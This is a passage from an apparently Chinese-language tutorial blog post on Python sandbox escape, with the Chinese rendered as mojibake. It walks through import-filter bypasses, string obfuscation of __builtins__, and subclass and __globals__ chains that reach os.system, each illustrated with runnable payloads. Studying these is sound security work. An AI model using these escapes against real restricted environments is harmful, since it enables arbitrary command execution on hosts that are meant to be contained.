NvidiaDetector, aptdaemon, imaplib, secrets, PIL, aptsources, imghdr, secretstorage, Quirks, argparse, imp, select, UbuntuDrivers, array, importlib, selectors, UbuntuSystemService, asn1crypto, inspect, shelve, UpdateManager, ast, io, shlex, __future__, asynchat, ipaddress, shutil, _ast, asyncio, itertools, signal, _asyncio, asyncore, janitor, simplejson, _bisect, atexit, json, site, _blake2, audioop, keyring, sitecustomize, _bootlocale, base64, keyword, six, _bz2, bdb, language_support_pkgs, smtpd, _cffi_backend, binascii, launchpadlib, smtplib, _codecs, binhex, linecache, sndhdr, _codecs_cn, bisect, locale, socket, _codecs_hk, brlapi, logging, socketserver, _codecs_iso2022, builtins, louis, softwareproperties, _codecs_jp, bz2, lsb_release, speechd, _codecs_kr, cProfile, lzma, speechd_config, _codecs_tw, cairo, macaroonbakery, spwd, _collections, calendar, macpath, sqlite3, _collections_abc, certifi, macurl2path, sre_compile, _compat_pickle, cgi, mailbox, sre_constants, _compression, cgitb, mailcap, sre_parse, _crypt, chardet, mako, ssl, _csv, chunk, markupsafe, stat, _ctypes, cmath, marshal, statistics, _ctypes_test, cmd, math, string, _curses, code, mimetypes, stringprep, _curses_panel, codecs, mmap, struct, _datetime, codeop, modual_test, subprocess, _dbm, collections, modulefinder, sunau, _dbus_bindings, colorsys, multiprocessing, symbol, _dbus_glib_bindings, compileall, nacl, symtable, _decimal, concurrent, netrc, sys, _dummy_thread, configparser, nis, sysconfig, _elementtree, contextlib, nntplib, syslog, _functools, copy, ntpath, systemd, _gdbm, copyreg, nturl2path, tabnanny, _hashlib, crypt, numbers, tarfile, _heapq, cryptography, oauth, telnetlib, _imp, csv, olefile, tempfile, _io, ctypes, opcode, termios, _json, cups, operator, test, _locale, cupsext, optparse, textwrap, _lsprof, cupshelpers, orca, _lzma, curses, os, threading, _markupbase, datetime, ossaudiodev, time, _md5, dbm, parser, timeit, _multibytecodec, dbus, pathlib, token, _multiprocessing, deb822, pcardext, tokenize, _opcode, debconf, pdb, trace, _operator, debian, pexpect, traceback, _osx_support, debian_bundle, pickle, tracemalloc, _pickle, decimal, pickletools, tty, _posixsubprocess, defer, pipes, turtle, _pydecimal, difflib, pkg_resources, types, _pyio, dis, pkgutil, typing, _random, distro_info, platform, ufw, _sha1, distro_info_test, plistlib, unicodedata, _sha256, distutils, poplib, unittest, _sha3, doctest, posix, urllib, _sha512, dummy_threading, posixpath, urllib3, _signal, email, pprint, usbcreator, _sitebuiltins, encodings, problem_report, uu, _socket, enum, profile, uuid, _sqlite3, errno, pstats, venv, _sre, faulthandler, pty, wadllib, _ssl, fcntl, ptyprocess, warnings, _stat, filecmp, pwd, wave, _string, fileinput, py_compile, weakref, _strptime, fnmatch, pyatspi, webbrowser, _struct, formatter, pyclbr, wsgiref, _symtable, fractions, pydoc, xdg, _sysconfigdata_m_linux_x86_64-linux-gnu, ftplib, pydoc_data, xdrlib, _testbuffer, functools, pyexpat, xkit, _testcapi, gc, pygtkcompat, xml, _testimportmultiple, genericpath, pymacaroons, xmlrpc, _testmultiphase, getopt, pyrfc3339, xxlimited, _thread, getpass, pytz, xxsubtype, _threading_local, gettext, queue, yaml, _tracemalloc, gi, quopri, zipapp, _warnings, glob, random, zipfile, _weakref, grp, re, zipimport, _weakrefset, gtweak, readline, zlib, _yaml, gzip, reportlab, zope, abc, hashlib, reprlib, aifc, heapq]methods = [os, sys, __builtins__]results = #ç©ºå­—å…¸ resultsï¼Œç”¨äºå­˜å‚¨æ¯ä¸ªæ¨¡å—çš„æ£€æŸ¥ç»“æœfor module in all_modules_3: results[module] = flag: 0, result: try: m = __import__(module) attrs = dir(m) #è·å–å¯¹è±¡ m çš„æ‰€æœ‰å±æ€§å’Œæ–¹æ³•çš„åç§°åˆ—è¡¨ for method in methods: if method in attrs: result = yes results[module][flag] = 1 else: result = no results[module][result][method] = result except Exception as e: print(e)for result in results: if results[result][flag]: print([+] + result) for r in results[result][result]: print( [-] + r + : + results[result][result][r]) all_modules_2å°±æ˜¯ 2.x çš„æ ‡å‡†åº“ï¼Œall_modules_3 å°±æ˜¯ 3.x çš„æ ‡å‡†åº“ èŠ±å¼ä½¿ç”¨importé¦–å…ˆï¼Œç¦ç”¨ import os è‚¯å®šæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸º import osimport osimport os... éƒ½å¯ä»¥ã€‚å¦‚æœå¤šä¸ªç©ºæ ¼ä¹Ÿè¿‡æ»¤äº†ï¼ŒPython èƒ½å¤Ÿ import çš„å¯ä¸æ­¢ importï¼Œè¿˜æœ‰ __import__ï¼š__import__(os)ï¼Œ__import__è¢«å¹²äº†è¿˜æœ‰ importlibï¼šimportlib.import_module(os).system(ls) è¿™æ ·å°±å®‰å…¨äº†å—ï¼Ÿå®é™…ä¸Šimportå¯ä»¥é€šè¿‡å…¶ä»–æ–¹å¼å®Œæˆã€‚å›æƒ³ä¸€ä¸‹ import çš„åŸç†ï¼Œæœ¬è´¨ä¸Šå°±æ˜¯æ‰§è¡Œä¸€éå¯¼å…¥çš„åº“ã€‚è¿™ä¸ªè¿‡ç¨‹å®é™…ä¸Šå¯ä»¥ç”¨ execfile æ¥ä»£æ›¿ï¼š execfile(/usr/lib/python2.7/os.py)system(ls) ä¸è¿‡è¦æ³¨æ„ï¼Œ2.x æ‰èƒ½ç”¨ï¼Œ3.x åˆ äº† execfileï¼Œä¸è¿‡å¯ä»¥è¿™æ ·ï¼š with open(/usr/lib/python3.6/os.py,r) as f: exec(f.read())system(ls) è¿™ä¸ªæ–¹æ³•å€’æ˜¯ 2.xã€3.x é€šç”¨çš„ ä¸è¿‡è¦ä½¿ç”¨ä¸Šé¢çš„è¿™ä¸¤ç§æ–¹æ³•ï¼Œå°±å¿…é¡»çŸ¥é“åº“çš„è·¯å¾„ã€‚å…¶å®åœ¨å¤§å¤šæ•°çš„ç¯å¢ƒä¸‹ï¼Œåº“éƒ½æ˜¯é»˜è®¤è·¯å¾„ã€‚å¦‚æœ sys æ²¡è¢«å¹²æ‰çš„è¯ï¼Œè¿˜å¯ä»¥ç¡®è®¤ä¸€ä¸‹ï¼Œï¼š import sysprint(sys.path) evalã€exec éƒ½æ˜¯ç›¸å½“å±é™©çš„å‡½æ•°ï¼Œexec æ¯” eval è¿˜è¦å±é™©ï¼Œå®ƒä»¬ä¸€å®šè¦è¿‡æ»¤ï¼Œå› ä¸ºå­—ç¬¦ä¸²æœ‰å¾ˆå¤šå˜å½¢çš„æ–¹å¼ï¼Œå¯¹å­—ç¬¦ä¸²çš„å¤„ç†å¯ä»¥æœ‰ï¼šé€†åºã€æ‹¼æ¥ã€base64ã€hexã€rot13â€¦ç­‰ç­‰ [__builtins__] == [\\x5f\\x5f\\x62\\x75\\x69\\x6c\\x74\\x69\\x6e\\x73\\x5f\\x5f] == [u\\u005f\\u005f\\u0062\\u0075\\u0069\\u006c\\u0074\\u0069\\u006e\\u0073\\u005f\\u005f] == [X19idWlsdGluc19f.decode(base64)] == [__buil+tins__] == [__builtins__] == [__buil.__add__(tins__)] == [_builtins_.join(__)] == [%c%c%c%c%c%c%c%c%c%c%c%c % (95, 95, 98, 117, 105, 108, 116, 105, 110, 115, 95, 95)]... æœ€åé‚£ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä»»æ„å­—ç¬¦éƒ½å¯ä»¥æ„é€ å‡ºæ¥ æ¢å¤ sys.modulessys.modules æ˜¯ä¸€ä¸ªå­—å…¸ï¼Œé‡Œé¢å‚¨å­˜äº†åŠ è½½è¿‡çš„æ¨¡å—ä¿¡æ¯ã€‚å¦‚æœ Python æ˜¯åˆšå¯åŠ¨çš„è¯ï¼Œæ‰€åˆ—å‡ºçš„æ¨¡å—å°±æ˜¯è§£é‡Šå™¨åœ¨å¯åŠ¨æ—¶è‡ªåŠ¨åŠ è½½çš„æ¨¡å—ã€‚æœ‰äº›åº“ä¾‹å¦‚ os æ˜¯é»˜è®¤è¢«åŠ è½½è¿›æ¥çš„ï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥ä½¿ç”¨ï¼ˆä½†æ˜¯å¯ä»¥é€šè¿‡ sys.modules æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚ sys.modules[os]ï¼‰ï¼ŒåŸå› åœ¨äº sys.modules ä¸­æœªç» import åŠ è½½çš„æ¨¡å—å¯¹å½“å‰ç©ºé—´æ˜¯ä¸å¯è§çš„ã€‚ å¦‚æœå°† os ä» sys.modules ä¸­å‰”é™¤ï¼Œos å°±å½»åº•æ²¡æ³•ç”¨äº†ï¼š sys.modules[os] = not allowed import os os.system(ls)Traceback (most recent call last): File stdin, line 1, in moduleAttributeError: str object has no attribute system æ³¨æ„ï¼Œè¿™é‡Œä¸èƒ½ç”¨ del sys.modules[os]ï¼Œå› ä¸ºï¼Œå½“ import ä¸€ä¸ªæ¨¡å—æ—¶ï¼šimport Aï¼Œæ£€æŸ¥ sys.modules ä¸­æ˜¯å¦å·²ç»æœ‰ Aï¼Œå¦‚æœæœ‰åˆ™ä¸åŠ è½½ï¼Œå¦‚æœæ²¡æœ‰åˆ™ä¸º A åˆ›å»º module å¯¹è±¡ï¼Œå¹¶åŠ è½½ Aã€‚ æ‰€ä»¥åˆ äº† sys.modules[os] åªä¼šè®© Python é‡æ–°åŠ è½½ä¸€æ¬¡ osã€‚ çœ‹åˆ°è¿™ä½ è‚¯å®šå‘ç°äº†ï¼Œå¯¹äºä¸Šé¢çš„è¿‡æ»¤æ–¹å¼ï¼Œç»•è¿‡çš„æ–¹å¼å¯ä»¥æ˜¯è¿™æ ·ï¼š sys.modules[os] = not alloweddel sys.modules[os]import osos.system(ls) èŠ±å¼æ‰§è¡Œå‡½æ•°é€šè¿‡ä¸Šé¢å†…å®¹æˆ‘ä»¬å¾ˆå®¹æ˜“å‘ç°ï¼Œå…‰å¼•å…¥ os åªä¸è¿‡æ˜¯ç¬¬ä¸€æ­¥ï¼Œå¦‚æœæŠŠ system è¿™ä¸ªå‡½æ•°å¹²æ‰ï¼Œä¹Ÿæ²¡æ³•é€šè¿‡os.systemæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶ä¸”è¿™é‡Œçš„systemä¹Ÿä¸æ˜¯å­—ç¬¦ä¸²ï¼Œä¹Ÿæ²¡æ³•ç›´æ¥åšç¼–ç ç­‰ç­‰æ“ä½œã€‚æˆ‘é‡åˆ°è¿‡ä¸€ä¸ªç¯å¢ƒï¼Œç›´æ¥åœ¨/usr/lib/python2.7/os.pyä¸­åˆ äº†systemå‡½æ•°ã€‚ã€‚ã€‚ ä¸è¿‡ï¼Œè¦æ˜ç¡®çš„æ˜¯ï¼Œos ä¸­èƒ½å¤Ÿæ‰§è¡Œç³»ç»Ÿå‘½ä»¤çš„å‡½æ•°æœ‰å¾ˆå¤šï¼š print(os.system(whoami))print(os.popen(whoami).read()) print(os.popen2(whoami).read()) # 2.xprint(os.popen3(whoami).read()) # 2.xprint(os.popen4(whoami).read()) # 2.x... è¿‡æ»¤systemçš„æ—¶å€™è¯´ä¸å®šè¿˜æœ‰å…¶ä»–å‡½æ•°ç»™æ¼äº† å…¶æ¬¡ï¼Œå¯ä»¥é€šè¿‡ getattr æ‹¿åˆ°å¯¹è±¡çš„æ–¹æ³•ã€å±æ€§ï¼š import osgetattr(os, metsys[::-1])(whoami) ä¸è®©å‡ºç° import ä¹Ÿæ²¡äº‹ï¼š getattr(getattr(__builtins__, __tropmi__[::-1])(so[::-1]), metsys[::-1])(whoami)macr0phag30 ä¸€æ ·å¯ä»¥ã€‚è¿™ä¸ªæ–¹æ³•åŒæ ·å¯ä»¥ç”¨äºé€ƒé€¸è¿‡æ»¤ import çš„æ²™ç®± getattr æ˜¯ Python ä¸­çš„ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œç”¨äºè·å–å¯¹è±¡çš„å±æ€§å€¼ã€‚å®ƒçš„è¯­æ³•å¦‚ä¸‹ï¼š getattr(object, name[, default]) objectï¼šè¡¨ç¤ºè¦è·å–å±æ€§çš„å¯¹è±¡ã€‚ nameï¼šè¡¨ç¤ºè¦è·å–çš„å±æ€§çš„åç§°ã€‚ defaultï¼šå¯é€‰å‚æ•°ï¼Œè¡¨ç¤ºå½“å±æ€§ä¸å­˜åœ¨æ—¶è¿”å›çš„é»˜è®¤å€¼ã€‚å¦‚æœçœç•¥äº† default å‚æ•°ï¼Œå¹¶ä¸”å±æ€§ä¸å­˜åœ¨ï¼Œé‚£ä¹ˆ getattr å°†ä¼šå¼•å‘ AttributeError å¼‚å¸¸ã€‚ getattr çš„ä½œç”¨æ˜¯ä»å¯¹è±¡ä¸­è·å–æŒ‡å®šåç§°çš„å±æ€§å€¼ã€‚å¦‚æœå¯¹è±¡ä¸­å­˜åœ¨è¯¥å±æ€§ï¼Œåˆ™è¿”å›è¯¥å±æ€§çš„å€¼ï¼›å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™æ ¹æ®æƒ…å†µè¿”å›é»˜è®¤å€¼æˆ–å¼•å‘å¼‚å¸¸ ä¸ getattr ç›¸ä¼¼çš„è¿˜æœ‰ __getattr__ã€__getattribute__ï¼Œå®ƒä»¬è‡ªå·±çš„åŒºåˆ«å°±æ˜¯getattrç›¸å½“äºclass.attrï¼Œéƒ½æ˜¯è·å–ç±»å±æ€§æ–¹æ³•çš„ä¸€ç§æ–¹å¼ï¼Œåœ¨è·å–çš„æ—¶å€™ä¼šè§¦å‘__getattribute__ï¼Œå¦‚æœ__getattribute__æ‰¾ä¸åˆ°ï¼Œåˆ™è§¦å‘__getattr__ï¼Œè¿˜æ‰¾ä¸åˆ°åˆ™æŠ¥é”™ builtinsã€builtin__ä¸__builtinså…ˆè¯´ä¸€ä¸‹ï¼Œbuiltinã€builtinsï¼Œ__builtin__ä¸__builtins__çš„åŒºåˆ«ï¼šé¦–å…ˆæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ Python ä¸­ï¼Œæœ‰å¾ˆå¤šå‡½æ•°ä¸éœ€è¦ä»»ä½• import å°±å¯ä»¥ç›´æ¥ä½¿ç”¨ï¼Œä¾‹å¦‚chrã€openã€‚ä¹‹æ‰€ä»¥å¯ä»¥è¿™æ ·ï¼Œæ˜¯å› ä¸º Python æœ‰ä¸ªå«å†…å»ºæ¨¡å—ï¼ˆæˆ–è€…å«å†…å»ºå‘½åç©ºé—´ï¼‰çš„ä¸œè¥¿ï¼Œå®ƒæœ‰ä¸€äº›å¸¸ç”¨å‡½æ•°ï¼Œå˜é‡å’Œç±»ã€‚é¡ºä¾¿è¯´ä¸€ä¸‹ï¼ŒPython å¯¹å‡½æ•°ã€å˜é‡ã€ç±»ç­‰ç­‰çš„æŸ¥æ‰¾æ–¹å¼æ˜¯æŒ‰ LEGB è§„åˆ™æ¥æ‰¾çš„ï¼Œå…¶ä¸­ B å³ä»£è¡¨å†…å»ºæ¨¡å—ï¼Œè¿™é‡Œä¹Ÿä¸å†èµ˜è¿°äº†ï¼Œæœ‰å…´è¶£çš„æœæœå°±æ˜ç™½äº†ã€‚ åœ¨ 2.x ç‰ˆæœ¬ä¸­ï¼Œå†…å»ºæ¨¡å—è¢«å‘½åä¸º __builtin__ï¼Œåˆ°äº† 3.x å°±æˆäº† builtinsã€‚å®ƒä»¬éƒ½éœ€è¦ import æ‰èƒ½æŸ¥çœ‹ï¼š2.xï¼š import __builtin__ __builtin__module __builtin__ (built-in) 3.xï¼š import builtins builtinsmodule builtins (built-in) ä½†æ˜¯ï¼Œ__builtins__ ä¸¤è€…éƒ½æœ‰ï¼Œå®é™…ä¸Šæ˜¯__builtin__å’Œbuiltins çš„å¼•ç”¨ã€‚å®ƒä¸éœ€è¦å¯¼å…¥ï¼Œæˆ‘ä¼°è®¡æ˜¯ä¸ºäº†ç»Ÿä¸€ 2.x å’Œ 3.xã€‚ä¸è¿‡__builtins__ä¸__builtin__å’Œbuiltinsæ˜¯æœ‰ä¸€ç‚¹åŒºåˆ«çš„ï¼Œæ„Ÿå…´è¶£çš„è¯å»ºè®®æŸ¥ä¸€ä¸‹ï¼Œè¿™é‡Œå°±ä¸å•°å—¦äº†ã€‚ä¸ç®¡æ€ä¹ˆæ ·ï¼Œ__builtins__ ç›¸å¯¹å®ç”¨ä¸€ç‚¹ï¼Œå¹¶ä¸”åœ¨ __builtins__é‡Œæœ‰å¾ˆå¤šå¥½ä¸œè¥¿ï¼š __import__ in dir(__builtins__)True __builtins__.__dict__[__import__](os).system(whoami)macr0phag3 eval in dir(__builtins__)True execfile in dir(__builtins__)True ï¼ˆä¸çŸ¥ä¸ºä½•æˆ‘åœ¨pycharmè‡ªå¸¦çš„æ§åˆ¶å°é‡Œé¢è¿è¡Œå°±ä¸è¡Œï¼Œä½†æ˜¯è‡ªå·±å†™è„šæœ¬çš„è¯å°±å¯ä»¥ï¼‰ è¿™é‡Œç¨å¾®è§£é‡Šä¸‹ x.__dict__ ï¼Œå®ƒæ˜¯ x å†…éƒ¨æ‰€æœ‰å±æ€§åå’Œå±æ€§å€¼ç»„æˆçš„å­—å…¸ï¼Œæœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š å†…ç½®çš„æ•°æ®ç±»å‹æ²¡æœ‰ __dict__ å±æ€§ æ¯ä¸ªç±»æœ‰è‡ªå·±çš„ __dict__ å±æ€§ï¼Œå°±ç®—å­˜ç€ç»§æ‰¿å…³ç³»ï¼Œçˆ¶ç±»çš„ __dict__ å¹¶ä¸ä¼šå½±å“å­ç±»çš„ __dict__ å¯¹è±¡ä¹Ÿæœ‰è‡ªå·±çš„ __dict__ å±æ€§ï¼ŒåŒ…å« self.xxx è¿™ç§å®ä¾‹å±æ€§ é‚£ä¹ˆæ—¢ç„¶__builtins__æœ‰è¿™ä¹ˆå¤šå±é™©çš„å‡½æ•°ï¼Œä¸å¦‚å°†é‡Œé¢çš„å±é™©å‡½æ•°ç ´åäº†ï¼š __builtins__.__dict__[eval] = not allowed æˆ–è€…ç›´æ¥åˆ äº†ï¼š del __builtins__.__dict__[eval] ä½†æ˜¯æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ reload(__builtins__) æ¥æ¢å¤ __builtins__ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨ reload çš„æ—¶å€™ä¹Ÿæ²¡å¯¼å…¥ï¼Œè¯´æ˜ reloadä¹Ÿåœ¨ __builtins__é‡Œï¼Œé‚£å¦‚æœè¿reloadéƒ½ä»__builtins__ä¸­åˆ äº†ï¼Œå°±æ²¡æ³•æ¢å¤__builtins__äº†ï¼Œéœ€è¦å¦å¯»ä»–æ³•ã€‚è¿˜æœ‰ä¸€ç§æƒ…å†µæ˜¯åˆ©ç”¨ exec command in _global åŠ¨æ€è¿è¡Œè¯­å¥æ—¶çš„ç»•è¿‡ï¼Œæ¯”å¦‚å®ç°ä¸€ä¸ªè®¡ç®—å™¨çš„æ—¶å€™ï¼Œåœ¨æœ€åæœ‰ç»™å‡ºä¾‹å­ã€‚ è¿™é‡Œæ³¨æ„ï¼Œ2.x çš„ reload æ˜¯å†…å»ºçš„ï¼Œ3.x éœ€è¦ import impï¼Œç„¶åå† imp.reloadã€‚ä½ çœ‹ï¼Œreload çš„å‚æ•°æ˜¯ moduleï¼Œæ‰€ä»¥è‚¯å®šè¿˜èƒ½ç”¨äºé‡æ–°è½½å…¥å…¶ä»–æ¨¡å— é€šè¿‡ç»§æ‰¿å…³ç³»é€ƒé€¸åœ¨ Python ä¸­æåˆ°ç»§æ‰¿å°±ä¸å¾—ä¸æ mroï¼Œmroå°±æ˜¯æ–¹æ³•è§£æé¡ºåºï¼Œå› ä¸º Python æ”¯æŒå¤šé‡ç»§æ‰¿ï¼Œæ‰€ä»¥å°±å¿…é¡»æœ‰ä¸ªæ–¹å¼åˆ¤æ–­æŸä¸ªæ–¹æ³•åˆ°åº•æ˜¯ A çš„è¿˜æ˜¯ B çš„ã€‚.__mro__ æˆ– .mro()ï¼Œæ˜¯ä¸ªå…ƒç»„ï¼Œè®°å½•äº†ç»§æ‰¿å…³ç³»ï¼š .__class__.__mro__(class str, class object) ç±»çš„å®ä¾‹åœ¨è·å– __class__ å±æ€§æ—¶ä¼šæŒ‡å‘è¯¥å®ä¾‹å¯¹åº”çš„ç±»ã€‚å¯ä»¥çœ‹åˆ°ï¼Œå±äº strç±»ï¼Œå®ƒç»§æ‰¿äº† object ç±»ï¼Œè¿™ä¸ªç±»æ˜¯æ‰€æœ‰ç±»çš„è¶…ç±»ã€‚å…·æœ‰ç›¸åŒåŠŸèƒ½çš„è¿˜æœ‰__base__å’Œ__bases__ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç»å…¸ç±»éœ€è¦æŒ‡æ˜ç»§æ‰¿ object æ‰ä¼šç»§æ‰¿å®ƒï¼Œå¦åˆ™æ˜¯ä¸ä¼šç»§æ‰¿çš„ï¼š class test:... pass... test.__bases__() class test(object):... pass... test.__bases__(type object,) é‚£ä¹ˆçŸ¥é“è¿™ä¸ªæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿ ç”±äºæ²¡æ³•ç›´æ¥å¼•å…¥ osï¼Œé‚£ä¹ˆå‡å¦‚æœ‰ä¸ªåº“å«oosï¼Œåœ¨oosä¸­å¼•å…¥äº†osï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡__globals__æ‹¿åˆ° osã€‚ä¾‹å¦‚ï¼Œsite è¿™ä¸ªåº“å°±æœ‰ osï¼š import site site.osmodule os from /Users/macr0phag3/.pyenv/versions/3.6.5/lib/python3.6/os.py æ€ä¹ˆç†è§£è¿™ä¸ª __globals__ å‘¢ï¼Ÿå®ƒæ˜¯å‡½æ•°æ‰€åœ¨çš„å…¨å±€å‘½åç©ºé—´ä¸­æ‰€å®šä¹‰çš„å…¨å±€å˜é‡ã€‚ä¹Ÿå°±æ˜¯åªè¦æ˜¯å‡½æ•°å°±ä¼šæœ‰è¿™ä¸ªå±æ€§ã€‚é™¤äº† builtin_function_or_method æˆ–è€…æ˜¯ wrapper_descriptor ã€method-wrapper ç±»å‹çš„å‡½æ•°ï¼Œä¾‹å¦‚ rangeã€range.__init__ã€.split ç­‰ç­‰ã€‚ é‚£ä¹ˆä¹Ÿå°±æ˜¯è¯´ï¼Œèƒ½å¼•å…¥ site çš„è¯ï¼Œå°±ç›¸å½“äºæœ‰ osã€‚é‚£å¦‚æœ site ä¹Ÿè¢«ç¦ç”¨äº†å‘¢ï¼Ÿæ²¡äº‹ï¼Œæœ¬æ¥ä¹Ÿå°±æ²¡æ‰“ç®—ç›´æ¥ import siteã€‚å¯ä»¥åˆ©ç”¨ reloadï¼Œå˜ç›¸åŠ è½½ osï¼š import site osTraceback (most recent call last): File stdin, line 1, in moduleNameError: name os is not defined os = reload(site.os) os.system(whoami)macr0phag3 è¿˜æœ‰ï¼Œæ—¢ç„¶æ‰€æœ‰çš„ç±»éƒ½ç»§æ‰¿çš„objectï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆç”¨__subclasses__çœ‹çœ‹å®ƒçš„å­ç±»ï¼ˆæˆ‘çš„å¦ä¸€ç¯‡åšå®¢sstiå­¦ä¹ ä¸­æœ‰ç›¸å…³çŸ¥è¯†ï¼‰ ä»¥ 2.x çš„site._Printerä¸ºä¾‹ï¼ˆpy3.x ä¸­å·²ç»ç§»é™¤äº†è¿™é‡Œ __globals__ çš„ osï¼‰ï¼š .__class__.__mro__[-1].__subclasses__()[71]._Printer__setup.__globals__[os]module os from /Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc # ä¸ºäº†é¿å… index ä½ç½®é—®é¢˜ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š [i._Printer__setup.__globals__[os] for i in .__class__.__mro__[-1].__subclasses__() if i.__name__ == _Printer]module os from /Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc os åˆå›æ¥äº†ã€‚å¹¶ä¸” site ä¸­è¿˜æœ‰ __builtins__ã€‚ è¿™ä¸ªæ–¹æ³•ä¸ä»…é™äº A-osï¼Œè¿˜é˜”ä»¥æ˜¯ A-B-osï¼Œæ¯”å¦‚ 2.x ä¸­çš„ warningsï¼š import warnings warnings.osTraceback (most recent call last): File stdin, line 1, in moduleAttributeError: module object has no attribute os warnings.linecachemodule linecache from /Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/linecache.pyc warnings.linecache.osmodule os from /Users/macr0phag3/.pyenv/versions/2.7.15/lib/python2.7/os.pyc åœ¨ç»§æ‰¿é“¾ä¸­å°±å¯ä»¥è¿™æ ·ï¼ˆpy3.x ä¸­å·²ç»ç§»é™¤äº†è¿™é‡Œ __globals__ çš„ linecacheï¼‰ï¼š [].__class__.__base__.__subclasses__()[59].__init__.__globals__[linecache].__dict__[os].system(whoami)macr0phag3 # ä¸ºäº†é¿å… index ä½ç½®é—®é¢˜ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š [i.__init__.__globals__[linecache].__dict__[os].system(whoami) for i in .__class__.__mro__[-1].__subclasses__() if i.__name__ == catch_warnings] é¡ºä¾¿è¯´ä¸€ä¸‹ï¼Œwarningsè¿™ä¸ªåº“ä¸­æœ‰ä¸ªå‡½æ•°ï¼šwarnings.catch_warningsï¼Œå®ƒæœ‰ä¸ª_moduleå±æ€§ï¼š def __init__(self, record=False, module=None):... self._module = sys.modules[warnings] if module is None else module... æ‰€ä»¥é€šè¿‡_moduleä¹Ÿå¯ä»¥æ„é€  payloadï¼ˆpy3.x ä¸­å·²ç»ç§»é™¤äº† catch_warnings çš„ linecacheï¼‰ï¼š [x for x in (1).__class__.__base__.__subclasses__() if x.__name__ == catch_warnings][0]()._module.linecache.os.system(whoami)macr0phag3 3.x ä¸­çš„warningsè™½ç„¶æ²¡æœ‰ linecacheï¼Œä¹Ÿæœ‰__builtins__ åŒæ ·ï¼Œpy3.x ä¸­æœ‰class os._wrap_closeï¼Œåˆ©ç”¨æ–¹å¼å¯ä»¥ä¸ºï¼š .__class__.__mro__[-1].__subclasses__()[133].__init__.__globals__[system](whoami)macr0phag3 # ä¸ºäº†é¿å… index ä½ç½®é—®é¢˜ï¼Œå¯ä»¥è¿™æ ·å†™ï¼š [i for i in .__class__.__mro__[-1].__subclasses__() if i.__name__ == _wrap_close][0].__init__.__globals__[system](whoami) å½“ç„¶è¿™æ ·ä¹Ÿæ˜¯å¯ä»¥çš„ï¼ˆ3.xï¼‰ï¼š set.mro()[-1].__subclasses__()[133].__init__.__globals__[system](whoami) é¡ºä¾¿æä¸€ä¸‹ï¼Œobject æœ¬æ¥å°±æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå¦‚æœæ²¡è¿‡æ»¤çš„è¯ï¼Œpayload å¯ä»¥å†ç®€åŒ–ä¸ºï¼š object.__subclasses__()[133].__init__.__globals__[system](whoami) è¿˜æœ‰ä¸€ç§æ˜¯åˆ©ç”¨builtin_function_or_method çš„ __call__ï¼š .__class__.__mro__[-1].__subclasses__()[29].__call__(eval, 1+1) æˆ–è€…ç®€å•ä¸€ç‚¹ï¼š [].pop.__class__.__call__(eval, 1+1) ä¸Šé¢è¿™äº› payload å¤§å¤šæ•°æ˜¯ç›´æ¥ index äº†ï¼Œä½†æ˜¯ç›´æ¥ç”¨ index ä¸å¤ªå¥å£®ï¼Œå¯ä»¥éƒ½æ¢æˆåˆ—è¡¨æ¨å¯¼å¼ï¼Œç”¨ __name__ æ¥è·å–æƒ³è¦çš„ classï¼Œä¸Šé¢ä¹Ÿä¸¾äº†å¥½å‡ ä¸ªä¾‹å­äº†ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´å•¦ã€‚ æœ€åå†è¡¥å……å‡ ä¸ªã€‚ å¯ä»¥è¿™æ ·åˆ©ç”¨ï¼š class test(dict): def __init__(self): print(super(test, self).keys.__class__.__call__(eval, 1+1)) # å¦‚æœæ˜¯ 3.x çš„è¯å¯ä»¥ç®€å†™ä¸ºï¼š # super().keys.__class__.__call__(eval, 1+1))test() è¿˜å¯ä»¥åˆ©ç”¨å¼‚å¸¸é€ƒé€¸ï¼š hack = lambda : [0][1]try: hack()except Exception as e: e.__traceback__.tb_next.tb_frame.f_globals[__builtins__][__import__](os).system(whoami) è¿˜å¯ä»¥åˆ©ç”¨ formatï¼š 0.__class__.__base__.format([]) x.__class__.__base__.format(x=[]) .__class__.__base__.format([]) (0.__class_+_.__base__).format([]) ï¼ˆè¿™é‡Œé¡ºæ‰‹è®°å½•ä¸‹ï¼Œå¯¹äºå­—å…¸é”®æ˜¯æ•´æ•°å‹çš„æ¯”å¦‚ 1:2ï¼Œformat æ˜¯æ— æ³•æ‹¿åˆ°å€¼çš„ :)ï¼Œè¿™æ ·ä¼šæŠ¥é”™ï¼š 0[1] .format(1:2)ï¼Œ1 å¼•å·å»æ‰çš„è¯åˆä¼šæŠ¥æ²¡æœ‰è¿™ä¸ªé”®ï¼Œè¿™ä¸ªç‰¹æ€§å¯ä»¥è§æ–‡æ¡£ï¼‰ ä¸Šé¢çš„è¿™äº›åˆ©ç”¨æ–¹å¼æ€»ç»“èµ·æ¥å°±æ˜¯é€šè¿‡ .mro()ã€__class__ã€type(...)ã€__mro__ã€__subclasses__ã€__base__ã€__bases__ ç­‰å±æ€§æ–¹æ³•å»è·å– objectï¼Œå†æ ¹æ®__globals__æ‰¾å¼•å…¥çš„__builtins__æˆ–è€…evalç­‰ç­‰èƒ½å¤Ÿç›´æ¥è¢«åˆ©ç”¨çš„åº“ï¼Œæˆ–è€…æ‰¾åˆ°builtin_function_or_methodç±»ç±»å‹__call__åç›´æ¥è¿è¡Œeval æ–‡ä»¶è¯»å†™2.x æœ‰ä¸ªå†…å»ºçš„ 